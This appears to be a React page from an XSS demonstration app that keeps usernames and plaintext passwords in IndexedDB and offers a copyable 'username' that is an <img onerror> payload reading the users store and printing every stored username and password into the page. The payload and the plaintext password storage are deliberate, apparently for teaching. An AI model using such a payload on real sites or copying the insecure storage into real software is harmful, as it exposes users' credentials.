import { useEffect, useRef, useState } from "react";
import { useForm } from "react-hook-form";
import { Link } from "react-router";
import { Transition, TransitionChild } from "@headlessui/react";
import { openDB } from "idb";
import type { DBSchema } from "idb";
import { CopyIcon, MenuIcon, XIcon } from "lucide-react";
import { toast } from "sonner";
import { LinkArrow } from "~/components/svgs/linkArrow";
import { Button } from "~/components/ui/button";
import { Input } from "~/components/ui/input";
import { Textarea } from "~/components/ui/textarea";
import {
  Tooltip,
  TooltipContent,
  TooltipTrigger,
} from "~/components/ui/tooltip";

interface MyDB extends DBSchema {
  users: {
    key: number;
    value: {
      username: string;
      password: string;
    };
    indexes: {
      username: string;
      password: string;
    };
  };
}

const dbName = "users_database";

const listHeading = (
  <h2 className="ml-5 font-semibold tracking-wide text-white uppercase">
    List of users
  </h2>
);

async function createDatabase() {
  const db = await openDB<MyDB>(dbName, 2, {
    upgrade(currentDB) {
      // Create a store of objects
      const store = currentDB.createObjectStore("users", {
        // The 'id' property of the object will be the key.
        keyPath: "id",
        // If it isn't explicitly set, create a value by auto incrementing.
        autoIncrement: true,
      });
      // Create an index on the 'date' property of the objects.
      store.createIndex("username", "username", { unique: true });
      store.createIndex("password", "password");
    },
  });

  return db;
}

interface State {
  username: string;
  password: string;
}

const initialState = {
  username: "",
  password: "",
};

const Home = () => {
  const [users, setUsers] = useState<State[]>([]);

  useEffect(() => {
    const doStuff = async () => {
      const db = await createDatabase();
      const promises = await db.getAll("users");

      if (promises.length === 0) {
        await db.add("users", {
          username: "davidMurdoch",
          password: "hunter2",
        });
        await db.add("users", {
          username: "newUser",
          password: "test",
        });
      }

      setUsers(await db.getAll("users"));
    };

    void doStuff();
  }, []);

  const { register, handleSubmit, reset } = useForm({
    defaultValues: initialState,
  });

  const onSubmit = async (data: State) => {
    const db = await createDatabase();
    await db.add("users", data);
    setUsers((prevState) => [...prevState, data]);
    reset(initialState, {
      keepDirtyValues: false,
      // dirtyFields: false, // dirtyFields will not be reset
      keepDirty: false, // dirty will not be reset
      keepIsSubmitted: false,
      keepTouched: false,
      keepIsValid: false,
      keepSubmitCount: false,
    });
  };

  const suggestionRef = useRef<HTMLElement>(null);

  const [isOpen, setOpen] = useState<boolean>(false);

  return (
    <div className="flex min-h-screen overflow-hidden bg-gray-100">
      <Transition show={isOpen}>
        <div className="h-full md:hidden">
          <div className="fixed inset-0 z-40 flex">
            <TransitionChild>
              <div className="transition-opacity duration-300 ease-linear data-enter:opacity-100 data-leave:opacity-100 data-enter:data-closed:opacity-0 data-leave:data-closed:opacity-0">
                <div className="fixed inset-0" aria-hidden="true">
                  <button
                    className="absolute inset-0 bg-gray-600 opacity-75"
                    onClick={() => setOpen(false)}
                    aria-label="Close sidebar"
                  />
                </div>
              </div>
            </TransitionChild>
            <TransitionChild>
              <div className="transform transition duration-300 ease-in-out data-enter:translate-x-0 data-leave:translate-x-0 data-enter:data-closed:-translate-x-full data-leave:data-closed:-translate-x-full">
                <div className="relative flex size-full max-w-xs flex-1 flex-col bg-indigo-700">
                  <div className="absolute top-0 right-0 -mr-12 pt-2">
                    <button
                      className="ml-1 flex size-10 items-center justify-center rounded-full focus:ring-2 focus:ring-white focus:outline-hidden focus:ring-inset"
                      onClick={() => setOpen(false)}
                    >
                      <span className="sr-only">Close sidebar</span>

                      <XIcon className="size-6 text-white" />
                    </button>
                  </div>
                  <div className="h-0 flex-1 overflow-y-auto pt-5 pb-4">
                    <div className="flex shrink-0 items-center px-4">
                      <img
                        className="h-8 w-auto"
                        // src="https://tailwindplus.com/img/logos/workflow-logo-indigo-300-mark-white-text.svg"
                        src="https://tailwindcss.com/plus-assets/img/logos/mark.svg?color=white"
                        alt="Workflow"
                      />
                    </div>
                    <nav className="mt-5 space-y-1 px-2">
                      {listHeading}
                      {users.map(({ username }) => (
                        <Link
                          to={`/${username}`}
                          key={`${username}-mobile-list`}
                          className="flex items-center rounded-md p-2 text-base font-medium text-white hover:bg-indigo-600/75"
                        >
                          <LinkArrow className="mr-4 size-6 text-indigo-300" />
                          {username}
                        </Link>
                      ))}
                    </nav>
                  </div>
                </div>
                <div className="w-14 shrink-0" aria-hidden="true" />
              </div>
            </TransitionChild>
          </div>
        </div>
      </Transition>

      <div className="hidden bg-indigo-700 md:flex md:shrink-0">
        <div className="flex w-64 flex-col">
          <div className="flex h-0 flex-1 flex-col">
            <div className="flex flex-1 flex-col overflow-y-auto pt-5 pb-4">
              <nav className="mt-5 flex-1 space-y-1 px-2">
                {listHeading}
                {users.map(({ username }) => (
                  <Link
                    to={`/${username}`}
                    key={`${username}-list`}
                    className="flex items-center rounded-md p-2 text-sm font-medium text-white hover:bg-indigo-600/75"
                  >
                    <LinkArrow className="mr-4 size-6 text-indigo-300" />
                    {username}
                  </Link>
                ))}
              </nav>
            </div>
          </div>
        </div>
      </div>
      <div className="flex w-0 flex-1 flex-col overflow-hidden">
        <div className="pt-1 pl-1 sm:pt-3 sm:pl-3 md:hidden">
          <button
            className="-mt-0.5 -ml-0.5 inline-flex size-12 items-center justify-center rounded-md text-gray-500 hover:text-gray-900 focus:ring-2 focus:ring-indigo-500 focus:outline-hidden focus:ring-inset"
            onClick={() => setOpen(true)}
          >
            <span className="sr-only">Open sidebar</span>

            <MenuIcon className="size-6" />
          </button>
        </div>

        <main className="flex w-full flex-col justify-center bg-gray-100 py-12 sm:px-6 lg:px-8">
          <div className="sm:mx-auto sm:w-full sm:max-w-md">
            <h2 className="text-center text-base font-semibold tracking-wide text-indigo-600 uppercase">
              XSS example
            </h2>

            <h2 className="mt-6 text-center text-3xl font-extrabold text-gray-900">
              Create new account
            </h2>
          </div>

          <div className="mt-8 sm:mx-auto sm:w-full sm:max-w-xl">
            <div className="bg-white px-4 py-8 shadow-sm sm:rounded-lg sm:px-10">
              {/*TODO: fix this*/}
              {/*oxlint-disable-next-line typescript/strict-void-return */}
              <form className="space-y-6" onSubmit={handleSubmit(onSubmit)}>
                <div className="space-y-4">
                  <fieldset>
                    <label
                      htmlFor="email"
                      className="block text-sm font-medium text-gray-700"
                    >
                      Username
                    </label>
                    <div className="mt-1">
                      <Textarea
                        id="username"
                        {...register("username", {
                          required: true,
                        })}
                      />
                    </div>
                  </fieldset>
                  <div className="flex items-start">
                    <Tooltip>
                      <TooltipTrigger
                        className="rounded-full p-4 hover:bg-gray-200"
                        // TODO: fix this
                        // oxlint-disable-next-line typescript/strict-void-return
                        onClick={async () => {
                          if (suggestionRef.current) {
                            await navigator.clipboard.writeText(
                              suggestionRef.current.innerText,
                            );

                            toast("Copied!");
                          }
                        }}
                      >
                        <CopyIcon className="size-6" />
                      </TooltipTrigger>
                      <TooltipContent>
                        <p>Copy</p>
                      </TooltipContent>
                    </Tooltip>
                    <small
                      className="ml-3 text-gray-700"
                      ref={suggestionRef}
                    >{`<img onerror='
                (() => {
                  const request = indexedDB.open("users_database", 2);
                  request.onsuccess = function (event) {
                    const db = event.target.result;
                    const transaction = db.transaction(["users"], "readwrite");
                    const objectStore = transaction.objectStore("users");
                    const contents = objectStore.getAll();
                    contents.onsuccess = (event) => {
                      const data = event.target.result;

                      console.log(data, "data");

                      const main = document.querySelector("main");

                      const tr = document.createElement("tr");

                      const th1 = document.createElement("th");
                      const th2 = document.createElement("th");

                      th1.classList.add("px-4", "py-2");
                      th2.classList.add("px-4", "py-2");

                      th1.textContent="Username";
                      th2.textContent="Password";

                      const thead = document.createElement("thead");
                      const tbody = document.createElement("tbody");

                      const table = document.createElement("table");
                      const container = document.createElement("div");

                      thead.classList.add("bg-gray-50");

                      table.classList.add("divide-y", "divide-gray-200");

                      container.classList.add("shadow-sm", "overflow-hidden", "border-b", "border-gray-200", "sm:rounded-lg");

                      tr.append(th1);
                      tr.append(th2);

                      thead.append(tr);

                      table.append(thead);

                      for (const { username, password } of data) {
                        const tr = document.createElement("tr");
                        const td1 = document.createElement("td");
                        const td2 = document.createElement("td");

                        td1.classList.add("border", "px-4", "py-2");
                        td2.classList.add("border", "px-4", "py-2");

                        td1.textContent = username;
                        td2.textContent = password;

                        tr.append(td1);
                        tr.append(td2);

                        tbody.append(tr);
                      }

                      table.append(tbody);

                      container.append(table);

                      main.append(container);

                    };
                  };
                })();
              ' src='invalid-image'>`}</small>
                  </div>
                </div>

                <div>
                  <label
                    htmlFor="password"
                    className="block text-sm font-medium text-gray-700"
                  >
                    Password
                  </label>
                  <div className="mt-1">
                    <Input
                      id="password"
                      {...register("password", {
                        required: true,
                      })}
                      type="password"
                      autoComplete="current-password"
                    />
                  </div>
                </div>

                <div>
                  <Button type="submit" className="w-full px-4 py-2">
                    Continue
                  </Button>
                </div>
              </form>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
};

export default Home;
